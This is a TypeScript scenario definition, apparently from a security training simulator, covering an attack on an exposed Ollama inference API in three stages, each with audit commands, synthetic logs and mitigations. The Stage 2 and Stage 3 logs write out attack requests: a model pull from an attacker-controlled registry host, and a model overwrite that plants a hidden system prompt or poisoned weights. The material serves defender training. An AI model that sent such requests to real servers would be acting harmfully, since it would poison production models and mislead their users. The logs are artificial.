import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'ai-ollama-vllm-inference-server-model-poisoning-ssrf-audit',
    title: 'Oligo Security, Wiz AI Research & OWASP LLM04/LLM06 — Exposed Ollama Inference API (:11434) Rogue Registry Pull & Modelfile Audit',
    category: 'AI_LLM_MLOPS_SECURITY',
    mitreId: 'T1190',
    description:
      'Grounded in Oligo Security and Wiz AI research on exposed LLM inference servers, OWASP Top 10 for LLM Applications (LLM04 Model Poisoning / LLM06 Excessive Agency), and MITRE ATLAS: AI infrastructure defenders audit unauthenticated Ollama REST API endpoints on TCP port 11434, inspect POST /api/pull Server-Side Request Forgery (SSRF) and rogue OCI registry interactions, and verify GGUF/Safetensors SHA-256 digests.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External API Caller', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Ollama REST Server (:11434)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'GGUF Model Store & Runner', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'AI Gateway & eBPF Network Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Rogue OCI Registry & Internal Metadata', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated Model Enumeration via GET /api/tags & POST /api/show',
        narration:
          'When an Ollama inference server is bound to OLLAMA_HOST=0.0.0.0:11434 without an authenticating reverse proxy, an external client calls GET /api/tags and POST /api/show to enumerate loaded enterprise fine-tuned models, system prompts, LoRA adapters, and template parameters.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Discovery (T1518 - Software Discovery)',
        technicalCommands: [
          'ss -tulpn | grep 11434',
          'journalctl -u ollama -n 100 --no-pager | grep -E "/api/tags|/api/show"',
        ],
        defenseMitigation:
          'Bind Ollama strictly to loopback (OLLAMA_HOST=127.0.0.1:11434) and place an authenticating AI Gateway (with API key or mTLS verification) in front of all /api/* endpoints.',
        logs: [
          {
            id: 'ai-ollama-1',
            timestamp: '14:15:08.112',
            source: 'Web Access Log',
            severity: 'high',
            EventCode: 200,
            ProcessName: 'ollama',
            CommandLine: 'GIN /api/tags & POST /api/show {"name":"corp-finance-assistant:latest"}',
            raw: '[GIN] 2026/11/17 - 14:15:08 | 200 | 1.42ms | 198.51.100.62 | POST "/api/show" model="corp-finance-assistant:latest"',
            parsedFields: {
              ExposedService: 'Ollama Inference API (TCP Port 11434, OLLAMA_HOST=0.0.0.0)',
              EnumeratedEndpoint: 'GET /api/tags & POST /api/show',
              LeakedConfiguration: 'System Prompt, Fine-Tuned LoRA Adapter Path & GGUF SHA-256 Digest',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Arbitrary Registry Model Pull & SSRF via POST /api/pull',
        narration:
          'The external caller invokes POST /api/pull with a custom registry host URL ({"name":"registry.attacker-infra.net/library/poisoned-llm:v1"}), causing the Ollama server daemon to initiate outbound HTTPS requests to the untrusted registry (SSRF) and download tampered GGUF layer blobs into ~/.ollama/models/blobs/.',
        activeNodes: ['firewall', 'target', 'ad'],
        mitreTactic: 'Stage Capabilities (T1608.001 - Stage Capabilities: Upload Malware)',
        technicalCommands: [
          'journalctl -u ollama --no-pager | grep "/api/pull"',
          'sha256sum /usr/share/ollama/.ollama/models/blobs/sha256-*',
        ],
        defenseMitigation:
          'Restrict outbound egress from GPU inference nodes via network firewall rules to approved internal model registries only, and block external access to /api/pull, /api/push, /api/create, and /api/delete.',
        logs: [
          {
            id: 'ai-ollama-2',
            timestamp: '14:16:22.490',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'ollama',
            CommandLine: 'POST /api/pull {"name":"198.51.100.62:5000/namespace/backdoored-adapter:latest"}',
            raw: '[GIN] 2026/11/17 - 14:16:22 | 200 | 4.81s | 198.51.100.62 | POST "/api/pull" pulling manifest from https://198.51.100.62:5000/v2/namespace/backdoored-adapter/manifests/latest',
            parsedFields: {
              AbusedEndpoint: 'POST /api/pull (Custom Registry SSRF & Untrusted Blob Ingestion)',
              OutboundConnection: 'ollama -> https://198.51.100.62:5000/v2/.../blobs/sha256:9f4a8b...',
              BlobStoragePath: '/usr/share/ollama/.ollama/models/blobs/sha256-9f4a8b...',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Production Model Alias Overwrite via POST /api/create & Prompt Backdoor Audit',
        narration:
          'By calling POST /api/create with {"name":"corp-finance-assistant:latest","modelfile":"FROM ... SYSTEM ..."}, the caller overwrites the production model tag in ~/.ollama/models/manifests/ to embed a hidden system prompt instruction or poisoned weights that alter downstream application responses.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1565.001 - Data Manipulation: Stored Data Manipulation)',
        technicalCommands: [
          'cat /usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/corp-finance-assistant/latest | jq .',
          'ausearch -f /usr/share/ollama/.ollama/models/manifests -m SYSCALL',
        ],
        defenseMitigation:
          'Mount ~/.ollama/models as read-only (ro) in production inference containers after pre-loading verified model digests during CI/CD build time, and monitor manifest files with Linux auditd / Falco.',
        logs: [
          {
            id: 'ai-ollama-3',
            timestamp: '14:17:05.918',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 257,
            ProcessName: 'ollama',
            CommandLine: 'POST /api/create {"name":"corp-finance-assistant:latest"} manifest digest modified',
            raw: 'type=SYSCALL msg=audit(1763398625.918:942): arch=c000003e syscall=257 success=yes exe="/usr/local/bin/ollama" name="/usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/corp-finance-assistant/latest"',
            parsedFields: {
              AbusedEndpoint: 'POST /api/create (Production Model Tag Overwrite)',
              ModifiedManifest: 'manifests/registry.ollama.ai/library/corp-finance-assistant/latest',
              OWASPCategory: 'OWASP LLM04:2025 (Data and Model Poisoning)',
            },
          },
        ],
      },
    ],
  };
